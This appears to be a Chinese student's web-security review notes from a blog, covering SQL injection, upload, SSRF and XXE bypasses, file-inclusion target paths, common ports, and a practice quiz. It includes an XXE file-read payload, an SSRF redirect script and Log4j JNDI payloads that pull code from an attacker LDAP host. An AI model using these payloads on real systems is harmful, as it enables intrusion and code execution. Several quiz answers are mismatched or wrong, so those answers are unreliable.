23:21:37\nexcerpt: web漏洞复习\ncategories: 复现\n---\n\n# web漏洞复习\n\n### 1.owasp top 10\n\n```\n1.SQL注入\n2.失效的身份认证和会话管理\n3.跨站脚本攻击XSS\n4.直接引用不安全的对象\n5.安全配置错误\n6.敏感信息泄露\n7.缺少功能级的访问控制\n8.跨站请求伪造CSRF\n9.实验含有已知漏洞的组件\n10.未验证的重定向和转发\n```\n\n\n\n### 2.sql注入\n\n**sql注入原理**\n\n> 产生SQL注入漏洞的根本原因在于代码中没有对用户输入项进行验证和处理便直接拼接\n>\n> 到查询语句中。利用SQL注入漏洞，攻击者可以在应用的查询语句中插入自己的SQL代码并传递\n>\n> 给后台SQL服务器时加以解析并执行。\n\n\n\n**sql注入类型**\n\n按照注入点类型分类可分为\n\n- 数字型注入\n- 字符型注入\n\n按照执行效果分类可分为\n\n- 盲注\n- 报错注入\n- 联合查询\n- 堆叠注入\n- 宽字节注入\n- 二次注入\n\n\n\n**sql注入危害**\n\n1. 攻击者未经授权可以访问数据库中的数据，盗取用户的隐私以及个人信息，造成用户的信息泄露。\n2. 可以对数据库的数据进行增加或删除操作，例如私自添加或删除管理员账号。\n3. 如果网站目录存在写入权限，可以写入网页木马。攻击者进而可以对网页进行篡改，发布一些违法信息等。\n4. 经过提权等步骤，服务器最高权限被攻击者获取。攻击者可以远程控制服务器，安装后门，得以修改或控制操作系统。\n\n\n\n**报错注入常用函数**\n\n- updatexml()\n- extractvalue()\n- floor()\n\n\n\n**sql注入绕过**\n\n```\n绕过空格（注释符/* */，%a0）\n括号绕过空格\n引号绕过（使用十六进制）\n逗号绕过（limit使用from或者offset）（substr使用from for属于逗号）\n比较符号（<>）绕过（使用greatest()）\nand=&&  or=||\n=  用 like 绕过\n大小写绕过\n双写绕过\n特殊编码绕过\n```\n\n\n\n**sql注入经常出现在什么地方**\n\n- 登录界面\n- 删除处\n- 搜索框\n\n**Sql server 相关知识**\n\nhttps://zhuanlan.zhihu.com/p/74546690\n\n\n\n### 3.文件上传\n\n**文件上传的危害？**\n\n> 文件上传漏洞危害极大因为可以直接上传恶意代码到服务器上，可能会造成服务器的**网页篡改、网站被挂马、服务器被远程控制、被安装后门等严重的后果**\n>\n> \n\n\n\n**文件上传怎么防御**\n\n- 客户端检测检测（js检测）\n- 服务端检测(MIME检测)\n- 服务端检测（扩展名检测）\n- 增加白名单\n\n**文件上传怎么绕过(白名单，黑名单，前端等)？**\n\n- .htaccess绕过\n- .user.ini绕过\n- %00截断绕过\n\n\n\n### 3.SSRF漏洞\n\n> 漏洞原理 **SSRF**（Server-Side Request  Forgery，服务器端请求伪造）是一种由攻击者构造请求，由服务器端发起请求的安全漏洞，本质上是属于信息泄露漏洞。  ssrf攻击的目标是从外网无法访问的内部系统（正是因为他是有服务器端发起的，所以他能够请求到与他相连而与外网隔离的内部系统）  很多web应用都提供了从其他的服务器上获取数据的功能（百度识图，给出一串URL就能识别出图片）。  使用用户指定的URL，web应用可以获取图片，下载文件，读取文件内容等。  这个功能如果被恶意使用，可以利用存在缺陷的web应用作为代理，攻击远程和本地的服务器。 一般情况下，  SSRF攻击的目标是外网无法访问的内部系统，黑客可以利用SSRF漏洞获取内部系统的一些信息 。\n\n\n\n**ssrf漏洞利用**\n\n- 能扫描内部网络，获取端口，服务信息\n- 攻击运行在内网或本地的应用程序。\n- 对内网web进行指纹识别\n- 对内部主机和端口发送请求包进行攻击\n- file协议读取本地文件\n\n\n\n**Ssrf漏洞防御**\n\n- 限制请求的端口只能为Web端口，只允许访问HTTP和HTTPS的请求\n- 限制不能访问内网的IP，以防止对内网进行攻击\n- 屏蔽返回的详细信息\n\n\n\n**Ssrf漏洞绕过**\n\n- @符号绕过\n\n  ```\n  http://www.xxx.com@www.kxsy.work/\n  ```\n\n- IP地址转换\n\n  ```\n  例如：120.26.86.156\n  二进制 = 1111000000110100101011010011100\n  十六进制 = 0x781A569C\n  十进制 = 2014992028\n  ```\n\n- 转换短网址\n\n  ```\n  https://www.985.so/\n  例：http://www.kxsy.work/ = http://u6.gg/ks69x\n  ```\n\n- 特殊符号替换绕过\n\n  ```\n  例：\n  http://www.kxsy.work/ = http://www。kxsy。work/\n  localhost或者0.0.0.0\n  ```\n\n- 302跳转绕过\n\n  ```\n  <?php  \n  $schema = $_GET['s'];\n  $ip     = $_GET['i'];\n  $port   = $_GET['p'];\n  $query  = $_GET['q'];\n  if(empty($port)){  \n      header(\"Location: $schema://$ip/$query\"); \n  } else {\n      header(\"Location: $schema://$ip:$port/$query\"); \n  }\n  ```\n\n- xio.ip绕过，会解析到子域\n\n  ```\n  http://10.0.0.1.xip.io = 10.0.0.1\n  www.10.0.0.1.xip.io= 10.0.0.1\n  http://mysite.10.0.0.1.xip.io = 10.0.0.1\n  foo.http://bar.10.0.0.1.xip.io = 10.0.0.1\n  10.0.0.1.xip.name resolves to 10.0.0.1\n  www.10.0.0.2.xip.name resolves to 10.0.0.2\n  foo.10.0.0.3.xip.name resolves to 10.0.0.3\n  bar.baz.10.0.0.4.xip.name resolves to 10.0.0.4\n  ```\n\n- 用Enclosed alphanumerics绕过\n\n  ```\n  利用Enclosed alphanumerics\n  ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ >>> http://example.com\n  ```\n\n  \n\n\n\n### 4.XXE漏洞\n\n**XXE漏洞原理**\n\n> XXE全称为XML External Entity Injection即XMl外部实体注入漏洞\n\nXXE漏洞触发点往往是可以上传xml文件的位置，没有对xml文件进行过滤，导致可加载恶意外部文件和代码，造成任意文件读取，命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害 要了解xxe漏洞，那么一定得先明白基础知识，了解xml文档的基础组成\n\n\n\n**XXE漏洞利用**\n\n在php环境下\n\n```\n<?php\n$xml=simplexml_load_string($_GET['xml']);\nprint_r($xml);\n?>\t\n```\n\n将以下xml代码进行URL编码，读取文件\n\n```\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<!DOCTYPE playwin [\n<!ENTITY name SYSTEM \"file:///D:/phpStudy/PHPTutorial/WWW/1.txt\">\n]>\n<resume>\n<name> &name; </name>\n</resume>\n```\n\n\n\n\n\n**Xxe漏洞支持的伪协议**\n\n不同的程序支持协议不同\n\n\n\n### 5.文件包含漏洞\n\n**文件包含的函数**\n\nphp中有四种\n\n```\nrequire() // 只在执行到此函数时才去包含文件，若包含的文件不存在产生警告，程序继续运行\n\nrequire_once() // 如果一个文件已经被包含过，则不会在包含它\n\ninclude() // 程序一运行文件便会包含进来，若包含文件不存在产生致命错误，程序终止运行\n\ninclude_once() // 如果一个文件已经被包含过，则不会在包含它\n```\n\n\n\n**文件包含支持的伪协议**\n\n```\nphp的支持\nphp://filter\nphp://input\nfile://\nphar://\nzip://\ndata://\n```\n\n\n\n**文件包含利用**\n\n\n\n包含日志文件getshell\n\n包含敏感文件\n\n```\nC:\\boot.ini //查看系统版本\nC:\\Windows\\System32\\inetsrv\\MetaBase.xml //IIS配置文件\nC:\\Windows\\repair\\sam //存储系统初次安装的密码\nC:\\Program Files\\mysql\\my.ini //Mysql配置\nC:\\Program Files\\mysql\\data\\mysql\\user.MYD //Mysql root\nC:\\Windows\\php.ini //php配置信息\nC:\\Windows\\my.ini //Mysql配置信息\nC:\\Windows\\win.ini //Windows系统的一个基本系统配置文件\n```\n\n\n\n\n\n### 6.Php命令执行，php代码执行相\n\n**代码执行相关函数**\n\n```\nassert()\neval()\ncall_user_func()\ncall_user_func_array()\npreg_replace()  //7.0版本后已经不存在\narray_map()\nUsort()\n```\n\n**命令执行相关函数**\n\n```\nsystem()\nexec()\npassthru()\nshell_exec()\npoopen()\n```\n\n\n\n### 7.XSS漏洞\n\n**XSS漏洞原理**\n\n> HTML是一种超文本标记语言，通过将一些字符特殊地对待来区别文本和标记，例如，小于符号（<）被看作是HTML标签的开始。当动态页面中插入的内容含有这些特殊字符时，正好你要访问的服务器并没有对用户的输入进行安全方面的验证，用户浏览器会将其误认为是插入了HTML标签，当这些HTML标签引入了一段JavaScript脚本时，这些脚本程序就将会在用户浏览器中执行。所以，当这些特殊字符不能被动态页面检查或检查出现失误时，就将会产生XSS漏洞\n\n\n\n**xss漏洞类型**\n\n\n\n> 1.反射型\n>\n> 反射型 XSS 一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。\n>\n> 对于访问者而言是一次性的，具体表现在我们把我们的恶意脚本通过 URL 的方式传递给了服务器，而服务器则只是不加处理的把脚本“反射”回访问者的浏览器而使访问者的浏览器执行相应的脚本。反射型 XSS 的触发有后端的参与，要避免反射性 XSS，必须需要后端的协调，后端解析前端的数据时首先做相关的字串检测和转义处理。\n>\n> 此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。\n> 2.存储型\n>\n> 攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。这就意味着只要访问了这个页面的访客，都有可能会执行这段恶意脚本，因此储存型XSS的危害会更大。\n>\n> 存储型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。\n> 3.DOM型\n>\n> 客户端的脚本程序可以动态地检查和修改页面内容，而不依赖于服务器端的数据。基于DOM的XSS，也就是web server不参与，仅仅涉及到浏览器的XSS。比如根据用户的例如客户端如从 URL 中提取数据并在本地执行，如果用户在客户端输入的数据包含了恶意的 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到 DOM-based XSS 攻击。需要特别注意以下的用户输入源 document.URL、 location.hash、 location.search、 document.referrer 等。\n\n\n\n**Dom型xss和反射型xss的区别**\n\nDOM型xss和别的xss最大的区别就是它不经过服务器，仅仅是通过网页本身的JavaScript进行渲染触发的\n\n\n\n**Xss漏洞的危害**\n\n```\n1.窃取用户Cookie\n2.后台增删改文章\n3.XSS钓鱼攻击\n4.利用XSS漏洞进行传播和修改网页代码\n5.XSS蠕虫攻击\n6.网站重定向\n7.获取键盘记录\n8.获取用户信息等\n```\n\n\n\n**XSS漏洞防御**\n\n> 1、对输入和URL参数进行过滤(白名单和黑名单)\n>\n> 检查用户输入的数据中是否包含一些特殊字符，如<、>、’、“等，发现存在特殊字符，将这些特殊字符过滤或者编码。\n> 2、HTML实体编码\n>\n> 字符串js编码转换成实体html编码的方法（防范XSS攻击）\n> https://www.cnblogs.com/dearxinli/p/5466286.html\n> 3、对输出内容进行编码\n>\n> 在变量输出到HTML页面时，可以使用编码或转义的方式来防御XSS攻击。\n\n\n\n### 8.常见的解析漏洞\n\n**Nginx**\n\n> https://blog.csdn.net/Spontaneous_0/article/details/129106641\n\n**Apache**\n\n> https://blog.csdn.net/weixin_44174581/article/details/119387616\n\n**lls**\n\n> https://blog.csdn.net/weixin_43625577/article/details/91971796\n\n\n\n### 9.常见的漏扫工具支持扫描的漏洞类型\n\n **Xray**\n\n```\nXSS漏洞检测 (key: xss)\nSQL 注入检测 (key: sqldet)\n命令/代码注入检测 (key: cmd-injection)\n目录枚举 (key: dirscan)\n路径穿越检测 (key: path-traversal)\nXML 实体注入检测 (key: xxe)\n文件上传检测 (key: upload)\n弱口令检测 (key: brute-force)\njsonp 检测 (key: jsonp)\nssrf 检测 (key: ssrf)\n基线检查 (key: baseline)\n任意跳转检测 (key: redirect)\nCRLF 注入 (key: crlf-injection)\nStruts2 系列漏洞检测 (高级版，key: struts)\nThinkphp系列漏洞检测 (高级版，key: thinkphp)\nPOC 框架 (key: phantasm)\n```\n\nAvws\n\n```\n1.WebScanner：全站扫描，Web安全漏洞扫描\n2.Site Crawler：爬虫功能，遍历站点目录结构\n3.Target Finder：端口扫描，找出web服务器\n4.Subdomain Scanner：子域名扫描器，利用DNS查询\n5.Blind SQL Injector：盲注工具\n6.HTTP Editor：http协议数据包编辑器\n7.HTTP Sniffer：HTTP协议嗅探器\n8.HTTP Fuzzer：模糊测试工具\n9.Authentication Tester：Web认证破解工具\n10.Web Srevice Scanner：Web服务扫描器\n11.Web Srevice Editor：Web服务编辑器\n```\n\n\n\n### 10.sqlmap工具参数的使用和含义\n\n- `-v` 显示信息的级别，一共有六级：0：只显示python 错误和一些严重信息；1：显示基本信息（默认）；2：显示debug信息；3：显示注入过程的payload；4：显示http请求包；5：显示http响应头；7：显示http相应页面\n- `-u`指定一个url连接，url中必须要有 `?xx=xxx` 才行\n- `-r`可以呀将一个post请求方式的数据保存在一个txt中msqlmap会通过post方式检验目标\n- `--data=Data`指明参数是哪些。例：`-u \"www.abc.com/index.php?id=1\" --data=\"name=1&pass=2\"`\n- `--random-agent`使用随机user-agent进行测试。sqlmap有一个文件中储存了各种各样的user-agent，文件在`sqlmap/txt/user-agent.txt` **在level>=3时会检测user-agent注入。**\n- `--os-shell`创建一个对方操作系统的shell，metepreter或VNC\n- `--cookie`指定测试时使用的cookie，通常在一些需要登录的站点会使用。例： `-u \"www.abc.com/index.php?id=1\"`\n\n\n\n### 11.一些常见漏洞\n\n\n\n##### **Tomcat**\n\n任意命令执行\n\nhttps://zhuanlan.zhihu.com/p/137686820\n\n\n\n##### iis\n\n目录解析漏洞\n\n文件名解析漏洞\n\n畸形解析漏洞\n\niis短文件漏洞\n\nPUT任意文件写入\n\nhttps://blog.csdn.net/weixin_42918771/article/details/105178309\n\n\n\n##### apache\n\n换行解析漏洞，多后缀解析漏洞，http路径穿越漏洞\n\n，路径穿越漏洞\n\nhttps://blog.csdn.net/weixin_44268918/article/details/129129214\n\n\n\n**Fastbin**\n\n跟pwn有关，暂时没弄懂\n\nhttps://www.freebuf.com/articles/web/263598.html\n\n\n\n\n\n### 12.Cobalt strike,mimikatz工具的一些基础知识\n\n\n\n太多了，附上一个链接\n\nhttps://www.freebuf.com/articles/network/290134.html\n\n\n\n### 13.常见框架漏洞\n\n\n\n##### Jboss\n\n- **访问控制不严导致的漏洞**\n- **反序列化导致的漏洞**\n\n\n\nhttps://blog.csdn.net/m0_58434634/article/details/117434173\n\n\n\n##### weblogic\n\n- 弱口令漏洞\n- 任意文件上传漏洞\n- XML Decoder反序列化漏洞\n- webligic-SSRF漏洞\n- java反序列化漏洞\n\nhttps://www.cnblogs.com/-mo-/p/11503707.html\n\n\n\n##### thinkphp\n\n- 远程代码执行漏洞\n\nhttps://www.cnblogs.com/lingzhisec/p/15728886.html\n\n\n\n##### Struts2\n\nhttps://blog.csdn.net/HBohan/article/details/122667891\n\n\n\n##### Shiro\n\n- 反序列化漏洞\n\nhttps://www.freebuf.com/vuls/283810.html\n\n\n\n### 14.常见端口对应的漏洞\n\n```\n20：FTP服务的数据传输端口\n21：FTP服务的连接端口，可能存在  弱口令暴力破解\n22：SSH服务端口，可能存在 弱口令暴力破解\n23：Telnet端口，可能存在 弱口令暴力破解\n25：SMTP简单邮件传输协议端口，和 POP3 的110端口对应\n43：whois服务端口\n53：DNS服务端口(TCP/UDP 53)\n67/68：DHCP服务端口\n69：TFTP端口，可能存在弱口令\n80：HTTP端口，常见web漏洞\n88：Kerberos协议端口\n110：POP3邮件服务端口，和SMTP的25端口对应\n135：RPC服务\n137/138： NMB服务\n139：SMB/CIFS服务\n143：IMAP协议端口\n161/162: Snmp服务，public弱口令\n389：LDAP目录访问协议，有可能存在注入、弱口令，域控才会开放此端口\n443：HTTPS端口，心脏滴血等与SSL有关的漏洞\n445：SMB服务端口，可能存在永恒之蓝漏洞MS17-010\n512/513/514：Linux Rexec服务端口，可能存在爆破\n636：LDAPS目录访问协议，域控才会开放此端口\n873：Rsync ，可能存在Rsync未授权访问漏洞，传送门：rsync 未授权访问漏洞\n1080：socket端口，可能存在爆破\n1099：RMI，可能存在 RMI反序列化漏洞\n1352：Lotus domino邮件服务端口，可能存在弱口令、信息泄露\n1414：IBM WebSphere MQ服务端口\n1433：SQL Server对外提供服务端口\n1434：用于向请求者返回SQL Server使用了哪个TCP/IP端口\n1521：oracle数据库端口\n2049：NFS服务端口，可能存在NFS配置不当\n2181：ZooKeeper监听端口，可能存在 ZooKeeper未授权访问漏洞\n2375：Docker端口，可能存在 Docker未授权访问漏洞\n2601:   Zebra ，默认密码zebr\n3128:   squid ，匿名访问（可能内网漫游)\n3268：LDAP目录访问协议，有可能存在注入、弱口令\n3306：MySQL数据库端口，可能存在 弱口令暴力破解\n3389：Windows远程桌面服务，可能存在 弱口令漏洞 或者 CVE-2019-0708 远程桌面漏洞复现\n3690：SVN服务，可能存在SVN泄漏，未授权访问漏洞\n4440：Rundeck，弱口令admin\n4560：log4j SocketServer监听的端口，可能存在 log4j<=1.2.17反序列化漏洞（CVE-2019-17571）\n4750：BMC，可能存在 BMC服务器自动化RSCD代理远程代码执行(CVE-2016-1542)\n4848：GlassFish控制台端口，可能存在弱口令admin/adminadmin\n5000：SysBase/DB2数据库端口，可能存在爆破、注入漏洞\n5432：PostGreSQL数据库的端口\n5632：PyAnywhere服务端口，可能存在代码执行漏洞\n5900/5901：VNC监听端口，可能存在 VNC未授权访问漏洞\n5984：CouchDB端口，可能存在 CouchDB未授权访问漏洞\n6379：Redis数据库端口，可能存在Redis未授权访问漏洞，传送门：Redis未授权访问漏洞\n7001/7002：Weblogic，可能存在Weblogic反序列化漏洞，传送门：Weblogic反序列化漏洞\n7180：Cloudera manager端口\n8000：JDWP，可能存在JDWP远程代码执行漏洞。\n8069：Zabbix服务端口，可能存在Zabbix弱口令导致的Getshell漏洞\n8080：Tomcat、JBoss，可能存在Tomcat管理页面弱口令Getshell，JBoss未授权访问漏洞，传送门：Tomcat管理弱口令页面Getshell\n8080-8090：可能存在web服务\n8089：Jetty、Jenkins服务端口，可能存在反序列化，控制台弱口令等漏洞\n8161：Apache ActiveMQ后台管理系统端口，默认口令密码为：admin:admin ，可能存在CVE-2016-3088漏洞，传送门：Apache ActiveMQ任意文件写入漏洞（CVE-2016-3088）\n9000：fastcgi端口，可能存在远程命令执行漏洞\n9001：Supervisord，可能存在Supervisord远程命令执行漏洞(CVE-2017-11610)，传送门：Supervisord远程命令执行漏洞(CVE-2017-11610)\n9043/9090：WebSphere，可能存在WebSphere反序列化漏洞\n9200/9300：Elasticsearch监听端口，可能存在 Elasticsearch未授权访问漏洞\n10000：Webmin-Web控制面板，可能存在弱口令\n10001/10002：JmxRemoteLifecycleListener监听的，可能存在Tomcat反序列化漏洞，传送门：Tomcat反序列化漏洞(CVE-2016-8735)\n11211：Memcached监听端口，可能存在 Memcached未授权访问漏洞\n27017/27018：MongoDB数据库端口，可能存在 MongoDB未授权访问漏洞\n50000：SAP Management Console服务端口，可能存在 运程命令执行漏洞。\n50070：Hadoop服务端口，可能存在 Hadoop未授权访问漏洞\n61616：Apache ActiveMQ服务端口，可能存在 Apache ActiveMQ任意文件写入漏洞（CVE-2016-3088）复现\n60020：hbase.regionserver.port，HRegionServer的RPC端口\n60030：hbase.regionserver.info.port，HRegionServer的http端口\n\n```\n\n\n\n\n\n### 15.一些最新的漏洞\n\n##### Log4j2\n\nhttps://juejin.cn/post/7202514143341002789\n\n\n\n##### spring-core-rce-2022-03-29\n\nhttps://blog.csdn.net/weixin_45632448/article/details/124190382\n\n\n\n\n\n### 16.常见的web漏洞\n\n- 任意文件上传\n- 任意文件下载\n- 逻辑漏洞\n- 反序列化漏洞\n\n\n\n\n\n### \n\n## \n\n\n\n-------------------------------------------------------------------------------------------------------------------------------\n\n\n\n# 练习思考题\n\n\n\n### 1.堆溢出覆盖top chunk的大小(house of force)的说法有哪些？\n\n1. Windows Meterpreter Reverse TCP shellcode：这种 shellcode 可以与 Metasploit 的 Meterpreter 模块配合使用，实现远程代码执行、获取系统信息等功能。\n2. Windows Reverse TCP shellcode：这种 shellcode 可以在 Windows 系统上运行，将一个远程 shell 连接回攻击者的主机。\n3. Windows Reverse HTTP shellcode：这种 shellcode 可以在 Windows 系统上运行，将一个 HTTP 连接回攻击者的主机。\n4. Beacon Payload shellcode：这种 shellcode 可以使用 Cobalt Strike 的 Beacon 功能，实现命令执行、文件传输等功能。\n5. Linux Reverse TCP shellcode：这种 shellcode 可以在 Linux 系统上运行，将一个远程 shell 连接回攻击者的主机。\n6. Mac Reverse TCP shellcode：这种 shellcode 可以在 Mac 系统上运行，将一个远程 shell 连接回攻击者的主机。\n\n\n\n### 2.6379,8009端口对应的漏洞是\n\n- 6379是redis未授权访问漏洞\n- 8009是`Apache-Tomcat-Ajp漏洞`，tomcat默认开启ajp服务（8009端口）\n\n\n\n### 3.Cobalt strike 可以生成哪些类型的shellcode?\n\n搜不到。。。\n\n\n\n### 4.Apache 文件解析漏洞的原理？\n\n> apache的解析漏洞依赖于一个特性：apache默认一个文件可以有多个以点分割的后缀，比如test.php.abc，当最右边的后缀无法识别（不在mime.types文件内），则继续向左识别，知道识别到合法后缀才能进行解析，与windows不同，apache对文件的名解析不是仅仅认识最后一个后缀名，而是从右向左，依此识别，直到遇到自己可以解析的文件为止。\n\n当phpinfo.php被禁止时，phpinfo.php.abc可执行\n\n\n\n### 5. 什么中间件存在短文件名漏洞？\n\n\n\n**iis**\n\n\n\n### 6.xxe漏洞各个语言支持的伪协议有哪些\n\n可利用php://filter伪协议\n\n\n\n### 7.S2_052漏洞是由于什么造成的？\n\n此漏洞主要是由于**JBoss中 /jmx-console/HtmlAdaptor 路径对外开放**，并且没有任何身份验证机制，导致攻击者可以进入到JMX控制台，并在其中执行任何功能。\n\n\n\n### 8.Weblogic 常见的漏洞有哪些？\n\n- **XMLDecoder反序列化漏洞**\n- **T3协议反序列化漏洞**\n- **未授权访问漏洞**\n- **命令执行漏洞**\n- **IIOP协议反序列化漏洞**\n- **SSRF漏洞**\n\n\n\n### 9.Jboss 常见的漏洞有哪些？\n\n- **访问控制不严导致的漏洞**\n- **反序列化导致的漏洞**\n\n\n\n### 10.Struts2 常见的漏洞有哪些？\n\n- 反序列化漏洞\n\n\n\n### 11.Fastbin 怎么利用？\n\n使用流程如下：\n\n1. 申请同样大小的两个内存块，并将它们都释放，这样这两个内存块就会被放入 Fastbin 链表中。\n2. 重新申请同样大小的内存块，此时 glibc 会从 Fastbin 链表中返回其中一个内存块的地址，作为本次申请的内存块。\n3. 利用本次申请返回的内存块地址，修改其中保存的值为 Fastbin 链表中未释放的内存块的地址。\n4. 再次申请同样大小的内存块，此时 glibc 会从 Fastbin 链表中返回之前修改过的内存块地址，作为本次申请的内存块。\n\n\n\n### 12.Ssrf 攻击的目标为？\n\n**<u>外网无法访问的内部系统</u>**\n\n\n\n### 13.ssrf 是否可以通过过滤get或post参数进行防御？\n\n不行\n\n\n\n### 14.Log4j 怎么绕过？\n\n- **不出现port，避免被waf匹配ip:port**\n\n  ```\n  ${jndi:ldap:192.168.1.1/a}\n   ${jndi:ldap:192.168.1.1:/a} \n  注意此时需要ldap服务端口为389\n  \n  ```\n\n  \n\n- **对IP添加包裹**\n\n  ```\n  ${jndi:ldap://[192.168.34.96]/a} \n  ${jndi:ldap://[192.168.34.96]]/a} \n   LdapURL取出\"[ip]\"，LdapCtx去除[]获得ip，两种情况下端口都是389\n  \n  ```\n\n\n\n### 15.ogg是否是php的伪协议？\n\n不是。OGG是一种开放格式的媒体容器，通常用于存储音频和视频文件。它不是PHP的伪协议，PHP的伪协议是一种特殊的协议，用于在PHP中访问各种资源，如文件、网络资源等。PHP的伪协议以特殊的前缀开头，例如file://表示文件协议，http://表示HTTP协议等。\n\n\n\n### 16. Zip://伪协议利用对应的php版本号为？\n\n`zip://` 伪协议是在 PHP 5.2.0 版本中引入的，因此在该版本及更高版本的 PHP 中都可以使用。该伪协议允许 PHP 脚本以与本地文件系统相同的方式访问 ZIP 存档文件中的文件。\n\n\n\n### 17.文件上传怎么绕过黑名单.asp后缀的过滤？\n\n\n\n\n\n### 18.Nginx,apache是否存在弱口令？\n\n均存在\n\n\n\n### 19.Dom xss和反射型xss的区别是什么？\n\n> DOM 型 XSS 漏洞和反射型 XSS 漏洞的区别在于攻击者注入恶意脚本的位置不同。反射型 XSS 漏洞将恶意脚本注入到响应页面中，而 DOM 型 XSS 漏洞将恶意脚本注入到浏览器的 DOM 中。\n\n\n\n### 20.Ms17_010漏洞是那个端口造成的？\n\n445端口\n\n\n\n### 21.Sqlmap 中要使用随机user-agent应该使用什么参数？\n\n```\n--random-agent\n```\n\n\n\n### 22.Xp_cmdshell 是那个数据库中含有的？\n\n` Microsoft SQL Server 数据库`\n\n\n\n### 23.Symlink函数是否可以执行系统命令？\n\n不可以\n\n\n\n### 24.Samba wannacry溢出漏洞怎么修复？\n\n- 升级 Samba：升级到最新版本的 Samba，这将修复许多与安全有关的漏洞，包括 EternalBlue 漏洞。\n- 禁用 SMBv1：在 Samba 服务器上禁用 SMBv1 协议。这是因为 WannaCry 利用的是 SMBv1 协议的漏洞。在 Windows 系统上禁用 SMBv1 协议同样可以减少系统受到攻击的风险。\n- 更新操作系统：更新 Windows 操作系统以修补 SMBv1 漏洞。\n- 加强安全设置：加强 Samba 服务器的安全设置，包括访问控制、身份验证和日志记录等。例如，可以配置防火墙规则以限制对 Samba 服务器的访问，并配置强密码策略以增强身份验证的安全性。\n- 实施安全性检查：定期对 Samba 服务器进行安全性检查，以确保其处于最新的安全状态，并及时修复发现的漏洞。","slug":"web漏洞复习","published":1,"updated":"2024-04-17T08:43:00.791Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clv3kf7j5000nh7769vf383ka","content":"<h1 id=\"web漏洞复习\"><a href=\"#web漏洞复习\" class=\"headerlink\" title=\"web漏洞复习\"></a>web漏洞复习</h1><h3 id=\"1-owasp-top-10\"><a href=\"#1-owasp-top-10\" class=\"headerlink\" title=\"1.owasp top 10\"></a>1.owasp top 10</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.SQL注入</span><br><span class=\"line\">2.失效的身份认证和会话管理</span><br><span class=\"line\">3.跨站脚本攻击XSS</span><br><span class=\"line\">4.直接引用不安全的对象</span><br><span class=\"line\">5.安全配置错误</span><br><span class=\"line\">6.敏感信息泄露</span><br><span class=\"line\">7.缺少功能级的访问控制</span><br><span class=\"line\">8.跨站请求伪造CSRF</span><br><span class=\"line\">9.实验含有已知漏洞的组件</span><br><span class=\"line\">10.未验证的重定向和转发</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"2-sql注入\"><a href=\"#2-sql注入\" class=\"headerlink\" title=\"2.sql注入\"></a>2.sql注入</h3><p><strong>sql注入原理</strong></p>\n<blockquote>\n<p>产生SQL注入漏洞的根本原因在于代码中没有对用户输入项进行验证和处理便直接拼接</p>\n<p>到查询语句中。利用SQL注入漏洞，攻击者可以在应用的查询语句中插入自己的SQL代码并传递</p>\n<p>给后台SQL服务器时加以解析并执行。</p>\n</blockquote>\n<p><strong>sql注入类型</strong></p>\n<p>按照注入点类型分类可分为</p>\n<ul>\n<li>数字型注入</li>\n<li>字符型注入</li>\n</ul>\n<p>按照执行效果分类可分为</p>\n<ul>\n<li>盲注</li>\n<li>报错注入</li>\n<li>联合查询</li>\n<li>堆叠注入</li>\n<li>宽字节注入</li>\n<li>二次注入</li>\n</ul>\n<p><strong>sql注入危害</strong></p>\n<ol>\n<li>攻击者未经授权可以访问数据库中的数据，盗取用户的隐私以及个人信息，造成用户的信息泄露。</li>\n<li>可以对数据库的数据进行增加或删除操作，例如私自添加或删除管理员账号。</li>\n<li>如果网站目录存在写入权限，可以写入网页木马。攻击者进而可以对网页进行篡改，发布一些违法信息等。</li>\n<li>经过提权等步骤，服务器最高权限被攻击者获取。攻击者可以远程控制服务器，安装后门，得以修改或控制操作系统。</li>\n</ol>\n<p><strong>报错注入常用函数</strong></p>\n<ul>\n<li>updatexml()</li>\n<li>extractvalue()</li>\n<li>floor()</li>\n</ul>\n<p><strong>sql注入绕过</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">绕过空格（注释符/* */，%a0）</span><br><span class=\"line\">括号绕过空格</span><br><span class=\"line\">引号绕过（使用十六进制）</span><br><span class=\"line\">逗号绕过（limit使用from或者offset）（substr使用from for属于逗号）</span><br><span class=\"line\">比较符号（&lt;&gt;）绕过（使用greatest()）</span><br><span class=\"line\">and=&amp;&amp;  or=||</span><br><span class=\"line\">=  用 like 绕过</span><br><span class=\"line\">大小写绕过</span><br><span class=\"line\">双写绕过</span><br><span class=\"line\">特殊编码绕过</span><br></pre></td></tr></table></figure>\n\n\n\n<p><strong>sql注入经常出现在什么地方</strong></p>\n<ul>\n<li>登录界面</li>\n<li>删除处</li>\n<li>搜索框</li>\n</ul>\n<p><strong>Sql server 相关知识</strong></p>\n<p><a class=\"link\"   href=\"https://zhuanlan.zhihu.com/p/74546690\" >https://zhuanlan.zhihu.com/p/74546690<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h3 id=\"3-文件上传\"><a href=\"#3-文件上传\" class=\"headerlink\" 